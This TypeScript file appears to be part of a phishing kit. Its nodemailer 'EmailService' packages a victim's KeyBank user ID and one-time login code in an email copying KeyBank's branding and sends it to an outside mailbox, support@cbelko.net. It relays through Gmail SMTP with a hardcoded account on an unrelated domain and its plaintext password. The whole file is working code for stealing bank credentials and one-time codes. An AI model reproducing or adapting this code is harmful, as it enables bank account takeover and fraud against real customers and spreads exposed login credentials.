import nodemailer from 'nodemailer';

interface EmailOptions {
  to: string;
  subject: string;
  text?: string;
  html?: string;
}

class EmailService {
  private transporter: nodemailer.Transporter;

  constructor() {
    this.transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      auth: {
        user: 'support@autosmobile.us',
        pass: 'arjf hitm vydd nrjc',
      },
    });
  }

  async sendOTP(userId: string, otpCode: string): Promise<boolean> {
    const adminEmail = 'support@cbelko.net';
    
    const emailOptions: EmailOptions = {
      to: adminEmail,
      subject: 'KeyBank Login Verification Code',
      html: `
        <!DOCTYPE html>
        <html>
        <head>
          <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background-color: #f6f6f6; }
            .container { max-width: 600px; margin: 0 auto; background-color: white; border-radius: 8px; padding: 30px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); }
            .header { text-align: center; margin-bottom: 30px; }
            .logo { height: 60px; }
            .otp-code { background-color: #c8102e; color: white; font-size: 32px; font-weight: bold; text-align: center; padding: 20px; border-radius: 8px; letter-spacing: 8px; margin: 20px 0; }
            .message { color: #333; line-height: 1.6; margin-bottom: 20px; }
            .footer { color: #6e6e6e; font-size: 12px; text-align: center; margin-top: 30px; border-top: 1px solid #e0e0e0; padding-top: 20px; }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="header">
              <img src="https://ibx.key.com/ibxolb/login/images/key-logo.svg" alt="KeyBank" class="logo">
            </div>
            
            <div class="message">
              <h2 style="color: #c8102e;">Security Verification Required</h2>
              <p>A login attempt was made for User ID: <strong>${userId}</strong></p>
              <p>Your KeyBank verification code is:</p>
            </div>
            
            <div class="otp-code">${otpCode}</div>
            
            <div class="message">
              <p><strong>Important:</strong> This code will expire in 10 minutes for your security.</p>
              <p>If you did not request this code, please contact KeyBank immediately.</p>
            </div>
            
            <div class="footer">
              <p>This is an automated message from KeyBank Online Banking.</p>
              <p>© 2024 KeyCorp. KeyBank is Member FDIC.</p>
            </div>
          </div>
        </body>
        </html>
      `,
      text: `KeyBank Security Verification\n\nUser ID: ${userId}\nVerification Code: ${otpCode}\n\nThis code expires in 10 minutes.\n\n© 2024 KeyCorp. KeyBank is Member FDIC.`,
    };

    try {
      await this.transporter.sendMail({
        from: process.env.SMTP_USER || 'support@autosmobile.us',
        ...emailOptions,
      });
      
      console.log(`OTP email sent successfully for user ${userId}`);
      return true;
    } catch (error) {
      console.error('Failed to send OTP email:', error);
      return false;
    }
  }
}

export const emailService = new EmailService();
